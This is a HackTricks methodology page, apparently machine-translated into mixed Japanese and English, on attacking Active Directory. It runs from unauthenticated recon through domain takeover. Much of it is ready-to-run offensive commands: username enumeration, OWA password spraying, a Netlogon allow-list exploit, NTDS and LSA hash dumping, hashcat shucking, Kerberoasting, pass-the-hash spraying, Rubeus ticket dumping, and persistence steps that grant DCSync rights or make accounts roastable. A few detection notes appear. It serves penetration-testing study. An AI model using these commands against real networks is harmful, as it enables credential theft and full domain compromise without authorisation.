# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は基盤となる技術として機能し、**network administrators** が **domains**、**users**、**objects** を network 内で効率的に作成・管理できるようにします。大規模に拡張できるよう設計されており、膨大な数の users を管理しやすい **groups** と **subgroups** に整理しつつ、さまざまなレベルで **access rights** を制御できます。

**Active Directory** の構造は、3つの主要な層、**domains**、**trees**、**forests** で構成されています。**domain** は、共通の database を共有する **users** や **devices** などの objects の集合を含みます。**trees** は、共有された structure で結ばれたこれらの domains の group であり、**forest** は、**trust relationships** によって相互接続された複数の trees の集合を表し、organizational structure の最上位層を形成します。各レベルごとに、特定の **access** および **communication rights** を割り当てることができます。

**Active Directory** における主要な概念は次のとおりです:

1. **Directory** – Active Directory objects に関するすべての information を格納します。
2. **Object** – **users**、**groups**、または **shared folders** を含む、directory 内の entities を指します。
3. **Domain** – directory objects の container として機能し、**forest** 内に複数の domains が共存でき、それぞれが独自の object collection を維持します。
4. **Tree** – 共通の root domain を共有する domains の grouping です。
5. **Forest** – Active Directory における組織構造の頂点であり、複数の trees と、それらの間の **trust relationships** で構成されます。

**Active Directory Domain Services (AD DS)** は、network 内での centralized management と communication に不可欠な一連の services を含みます。これらの services には以下が含まれます:

1. **Domain Services** – data storage を centralized し、**users** と **domains** の間の interactions を管理します。これには **authentication** と **search** 機能が含まれます。
2. **Certificate Services** – secure **digital certificates** の作成、配布、管理を担います。
3. **Lightweight Directory Services** – **LDAP protocol** を通じて directory-enabled applications をサポートします。
4. **Directory Federation Services** – 1回の session で複数の web applications をまたいで users を authenticate する **single-sign-on** 機能を提供します。
5. **Rights Management** – 権限のない配布や使用を制御することで、copyright material の保護を支援します。
6. **DNS Service** – **domain names** の resolution に不可欠です。

より詳しい説明は以下を確認してください: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

**AD を attack** する方法を学ぶには、**Kerberos authentication process** を本当によく **understand** する必要があります。\
[**まだ仕組みが分からないなら、このページを読んでください。**](kerberos-authentication.md)

## Cheat Sheet

[https://wadcoms.github.io/](https://wadcoms.github.io) には、AD を enumerate/exploit するために実行できる command を素早く確認するための情報が多くあります。

> [!WARNING]
> Kerberos communication では、操作を実行するために **full qualifid name (FQDN)** が必要です。IP address で machine にアクセスしようとすると、**kerberos ではなく NTLM が使われます**。

## Recon Active Directory (No creds/sessions)

AD 環境にアクセスできるが、credentials/sessions を持っていない場合は、次のことができます:

- **Pentest the network:**
- network を scan して machine と open ports を見つけ、**exploit vulnerabilities** するか、そこから **credentials** を **extract** します（たとえば、[printers could be very interesting targets](ad-information-in-printers.md)）。
- DNS を enumerate すると、web、printers、shares、vpn、media など、domain 内の主要な server に関する information が得られることがあります。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- これを行う方法の詳細は、一般的な [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) を参照してください。
- **smb services で null と Guest access を確認する**（modern Windows versions では動作しません）:
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB server の enumerate 方法の詳細な guide はここで確認できます:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap を enumerate**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP の enumerate 方法の詳細な guide はここで確認できます（特に **anonymous access** に注意してください）:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **network を Poison する**
- [**Responder で services を impersonating して credentials を収集する**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- [**relay attack を悪用して host に access する**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- [**evil-S で fake UPnP services を exposing して credentials を収集する**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- internal documents、social media、services（主に web）や公開情報から、domain environment 内の usernames/names を抽出します。
- 会社の従業員の complete names が分かれば、さまざまな AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)) を試せます。最も一般的な conventions は次のとおりです: _NameSurname_、_Name.Surname_、_NamSur_（各3文字）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3つの _random letters and 3 random numbers_（abc123）です。
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) と [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) のページを確認してください。
- **Kerbrute enum**: **invalid username** が要求されると、server は **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ を返し、その username が無効であることを判断できます。**Valid usernames** では、**AS-REP** response 内の **TGT** か、_KRB5KDC_ERR_PREAUTH_REQUIRED_ error のいずれかが返され、user に pre-authentication が必要であることを示します。
- **MS-NRPC に対する No Authentication**: domain controllers 上の MS-NRPC (Netlogon) interface に対して auth-level = 1 (No authentication) を使用します。この method は、MS-NRPC interface に bind した後、`DsrGetDcNameEx2` function を呼び出して、credentials なしで user または computer が存在するかを確認します。 [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool はこの type of enumeration を実装しています。research は [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf) で確認できます
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

ネットワーク内でこれらのサーバーのいずれかを見つけた場合、**ユーザー列挙**も実行できます。例えば、ツール [**MailSniper**](https://github.com/dafthack/MailSniper) を使えます:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> ユーザー名の一覧は [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) とこちら ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) で見つけられます。
>
> ただし、その前に、事前に行うべき recon ステップで **会社で働いている人の名前** を把握しているはずです。名前と姓が分かれば、スクリプト [**namemash.py**](https://gist.github.com/superkojiman/11076951) を使って、使える可能性のあるユーザー名を生成できます。

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

**Zerologon** が DC でパッチ適用済みでも、明示的に allow-list されたアカウントは依然として **legacy/vulnerable Netlogon secure-channel behavior** の影響を受ける可能性があります。危険な設定は GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`**、または対応するレジストリ値 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** です。

その値は **SDDL security descriptor** です（[Security Descriptors](security-descriptors.md) を参照）。DACL 内で該当する ACE を付与された任意のアカウントやグループが対象になります。たとえば、`O:BAG:BAD:(A;;RC;;;WD)` は実質的に **Everyone** を allow-list します。

実践的な operator の流れ:

1. **SYSVOL/GPO** と **live DC registry** の両方を確認して、allow-list された principal を特定する。
2. SDDL で見つかった SID を実際の AD users/computers に解決し、**DC machine accounts**、**trust accounts**、その他の特権マシンを優先する。
3. allow-list されたアカウントとして **MS-NRPC / Netlogon authentication** を繰り返し試す。
4. 成功したら、**Netlogon password-setting** を悪用して対象アカウントのパスワードをリセットする（公開 PoC では空文字列に設定する）。

公開 artifact からの簡単な triage / lab 例:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- The **scanner** is useful because the effective allow-list may exist in **SYSVOL**, in the **registry**, or in both.
- The exploit path itself is important because it **does not require Domain Admin privileges** once a vulnerable account has been identified.
- Compromising a **Domain Controller machine account** such as `DC$` is especially dangerous because resetting that password can directly enable broader **AD takeover** paths.
- **Brute-force feasibility** depends on the mode: the public artifact describes a meet-in-the-middle approach, a **24-bit** brute force when another computer account is available, and slower **32-bit** variants.

Detection / hardening notes:

- Audit the allow-list policy and remove anything except temporary, explicitly required compatibility exceptions.
- Monitor DC **System** events **5827/5828/5829/5830/5831** to catch vulnerable Netlogon connections being denied, discovered, or explicitly allowed by policy.
- Treat accounts in `VulnerableChannelAllowList` as **high-risk** until the legacy dependency is removed.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC が signing でブロックされても**、**LDAP** の状態は必ず確認する: `netexec ldap <dc>` は `(signing:None)` / 弱い channel binding を示す。DC で SMB signing が必須でも LDAP signing が無効なら、**relay-to-LDAP** の有効な対象のままで、**SPN-less RBCD** などの悪用が可能。

### クライアント側の printer credential leaks → ドメイン認証情報の一括検証

- Printer/web UI は、**マスクされた admin passwords を HTML に埋め込む**ことがある。ソース/devtools を見ると cleartext が見える場合があり（例: `<input value="<password>">`）、Basic-auth で scan/print repositories にアクセスできる。
- 取得した print jobs に、ユーザーごとの passwords を含む **plaintext の onboarding docs** が含まれることがある。テスト時は組み合わせを正しく対応させること:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## 認証情報/セッションありでの Active Directory 列挙

この段階では、**有効なドメインアカウントの認証情報またはセッションを侵害している**必要があります。有効な認証情報や、ドメインユーザーとしてのシェルがあるなら、**前に挙げた手段で他ユーザーを侵害できることも忘れないでください**。

認証付き列挙を始める前に、**Kerberos double hop problem** が何かを知っておくべきです。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 列挙

アカウントを侵害できていることは、**ドメイン全体の侵害を始める大きな一歩**です。なぜなら、**Active Directory 列挙**を開始できるからです。

[**ASREPRoast**](asreproast.md) に関しては、攻撃可能なユーザーをすべて見つけられるようになり、[**Password Spraying**](password-spraying.md) に関しては、**全ユーザー名のリスト**を取得して、侵害したアカウントのパスワード、空パスワード、そして新しく有望なパスワードを試せます。

- [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) を使える
- よりステルス性の高い [**powershell for recon**](../basic-powershell-for-pentesters/index.html) も使える
- [**powerview**](../basic-powershell-for-pentesters/powerview.md) を使って、より詳細な情報を抽出できる
- Active Directory の列挙に使えるもう1つの素晴らしいツールが [**BloodHound**](bloodhound.md) です。これは（使用する収集方法によりますが）**あまりステルスではありません**が、**それが気にならないなら**、ぜひ試すべきです。ユーザーがどこに RDP できるか、他グループへの経路などを見つけられます。
- **他の自動化された AD 列挙ツール:** [**AD Explorer**](bloodhound.md#ad-explorer)**、** [**ADRecon**](bloodhound.md#adrecon)**、** [**Group3r**](bloodhound.md#group3r)**、** [**PingCastle**](bloodhound.md#pingcastle)**。**
- [**AD の DNS records**](ad-dns-records.md) も、興味深い情報を含んでいる可能性があります。
- ディレクトリを列挙するために使える **GUI 付きツール** は、**SysInternal** Suite の **AdExplorer.exe** です。
- **ldapsearch** で LDAP database を検索し、_userPassword_ と _unixUserPassword_ フィールド、あるいは _Description_ に認証情報がないか探すこともできます。別の手法については [PayloadsAllTheThings の AD User comment 内の Password](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) を参照してください。
- **Linux** を使っているなら、[**pywerview**](https://github.com/the-useless-one/pywerview) でドメインを列挙することもできます。
- 自動化ツールとして次も試せます:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **すべてのドメインユーザーを抽出する**

Windows では、すべてのドメインユーザー名を簡単に取得できます (`net user /domain` ,`Get-DomainUser` または `wmic useraccount get name,sid`)。Linux では、次を使えます: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` または `enum4linux -a -u "user" -p "password" <DC IP>`

> この列挙セクションは小さく見えても、実は全体の中で最も重要な部分です。リンク（主に cmd、powershell、powerview、BloodHound のもの）にアクセスし、ドメインの列挙方法を学び、慣れるまで練習してください。アセスメント中は、DA への道筋を見つけるか、何もできないと判断するかの重要な局面になります。

### Kerberoast

Kerberoasting は、ユーザーアカウントに紐づくサービスが使う **TGS tickets** を取得し、その暗号化を**オフライン**で解読する手法です。暗号化はユーザーパスワードに基づいています。

詳細はここを参照:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

認証情報を入手したら、どの **machine** にアクセスできるか確認できます。そのためには、ポートスキャンに応じて、さまざまなプロトコルで複数のサーバーへの接続を試みる **CrackMapExec** を使えます。

### Local Privilege Escalation

通常のドメインユーザーとしての認証情報またはセッションを侵害し、そのユーザーで **ドメイン内の任意の machine にアクセス**できるなら、**ローカルで権限昇格し、認証情報を回収する方法**を探すべきです。ローカル管理者権限があって初めて、メモリ（LSASS）内やローカル（SAM）で**他ユーザーのハッシュをダンプ**できます。

この本には [**Windows の local privilege escalation**](../windows-local-privilege-escalation/index.html) と [**checklist**](../checklist-windows-privilege-escalation.md) の完全なページがあります。さらに、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) も忘れずに使ってください。

### Current Session Tickets

現在のユーザーに、予期しないリソースへのアクセス権を与える **tickets** があるとは **かなり考えにくい**ですが、確認することはできます:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

active directoryを列挙できていれば、**より多くのメールアドレス**と**ネットワークのより良い理解**を得られます。NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**を強制できるかもしれません。**

### Looks for Creds in Computer Shares | SMB Shares

基本的な認証情報をいくつか入手したら、AD内で共有されている**興味深いファイル**を**見つけられる**か確認すべきです。手動でもできますが、非常に退屈で繰り返しの多い作業です（しかも、確認すべき文書が何百件も見つかることがあります）。

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

他のPCや共有に**アクセスできる**なら、（SCF fileのような）**ファイルを配置**して、何らかの形でアクセスされると**あなたに対するNTLM認証を引き起こし**、そのNTLM challengeを**盗んで**クラックできるようにできます:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

この脆弱性により、認証済みユーザーであれば誰でも**domain controllerを侵害**できました。


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**以下の手法では、通常のdomain userでは不十分で、これらの攻撃を行うには特別な権限/認証情報が必要です。**

### Hash extraction

うまくいけば、[AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（relayingを含む）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[escalating privileges locally](../windows-local-privilege-escalation/index.html)を使って、**local admin**アカウントを侵害できているはずです。\
その後は、メモリ上とローカルにあるすべてのhashをダンプする番です。\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**ユーザーのhashを入手したら**、それを使ってそのユーザーを**impersonate**できます。\
そのhashを使って**NTLM authenticationを実行する****tool**を使用するか、新しい**sessionlogon**を作成してそのhashを**LSASS**内に**inject**し、**NTLM authentication**が実行されるたびにそのhashが使われるようにできます。最後の方法がmimikatzの動作です。\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

この攻撃は、一般的なNTLM protocol上のPass The Hashの代替として、**ユーザーのNTLM hashを使ってKerberos ticketsを要求する**ことを目的としています。したがって、これは特に**NTLM protocolが無効化され、Kerberosのみが認証protocolとして許可されているネットワークで有用**です。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** 攻撃手法では、攻撃者はパスワードやhash valuesの代わりに**ユーザーのauthentication ticketを盗みます**。盗んだticketは**ユーザーをimpersonateする**ために使用され、network内のresourcesやservicesへの**不正アクセス**を可能にします。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

**local administrator**の**hash**または**password**を持っているなら、それを使って他の**PCs**へ**local login**を試すべきです。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> これはかなり**ノイジー**で、**LAPS**で**緩和**できます。

### MSSQL Abuse & Trusted Links

ユーザーが **MSSQL インスタンスにアクセス**する権限を持っている場合、**MSSQL ホスト上でコマンドを実行**できる可能性があります（SA として実行されている場合）、**NetNTLM の hash を盗む**ことも、**relay attack** を実行することもできます。\
また、MSSQL インスタンスが別の MSSQL インスタンスから信頼されている（database link）場合、その信頼された database に対する権限があれば、**その trust relationship を使って他のインスタンスでもクエリを実行**できます。これらの trust は連鎖させることができ、最終的にコマンドを実行できる misconfigured な database を見つけられるかもしれません。\
**database 間の link は forest trust をまたいでも機能します。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

サードパーティの inventory および deployment suite は、しばしば credentials と code execution への強力な経路を公開しています。以下を参照してください:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 属性を持つ Computer object を見つけ、その computer に対する domain 権限がある場合、その computer に login したすべての users のメモリから TGT を dump できます。\
つまり、**Domain Admin がその computer に login した場合**、その TGT を dump して [Pass the Ticket](pass-the-ticket.md) を使って impersonate できます。\
constrained delegation により、さらに **Print Server を自動的に compromise する** こともできます（うまくいけば DC です）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

user または computer が "Constrained Delegation" を許可されている場合、その computer 上の一部の services に対して **任意の user として impersonate** できます。\
そのため、この user/computer の **hash を compromise** できれば、**任意の user**（domain admin を含む）として impersonate し、一部の services にアクセスできます。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

リモート computer の Active Directory object に対して **WRITE** 権限があると、**昇格された権限** で code execution を達成できます:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

compromised した user が、ある domain object に対して **興味深い権限** を持っていると、**横移動**/**権限昇格** が可能になることがあります。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

domain 内で **Spool service が listening している** ことを見つけると、**新しい credentials を取得**し、**権限昇格**するために **abuse** できます。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**他の users** が **compromised** された machine に **access** した場合、**メモリから credentials を収集**したり、プロセスに **beacons を inject** して impersonate することができます。\
通常 users は RDP 経由で system に access するので、ここでは third party の RDP sessions に対して行えるいくつかの attack を示します:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** は、domain に参加している computers 上の **local Administrator password** を管理する仕組みで、password が **randomize** され、一意で、頻繁に **changed** されることを保証します。これらの passwords は Active Directory に保存され、access は ACL により許可された users のみに制御されます。これらの passwords へ十分な権限で access できれば、他の computers への pivot が可能になります。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

compromised された machine から **certificates を収集**することは、環境内で権限昇格する方法の1つになり得ます:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**vulnerable templates** が設定されている場合、それらを abuse して権限昇格できます:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

**Domain Admin**、さらにできれば **Enterprise Admin** 権限を得たら、**domain database**: _ntds.dit_ を **dump** できます。

[**DCSync attack の詳細はこちら**](dcsync.md)。

[**NTDS.dit の盗み方の詳細はこちら**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

前述した techniques のいくつかは persistence に使えます。\
例えば、次のことができます:

- users を [**Kerberoast**](kerberoast.md) の対象にする

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- users を [**ASREPRoast**](asreproast.md) の対象にする

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- user に [**DCSync**](#dcsync) 権限を付与する

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** は、特定の service 向けに **正規の Ticket Granting Service (TGS) ticket** を、**NTLM hash**（たとえば **PC account の hash**）を使って作成します。この method は、**service privileges へアクセス**するために使われます。


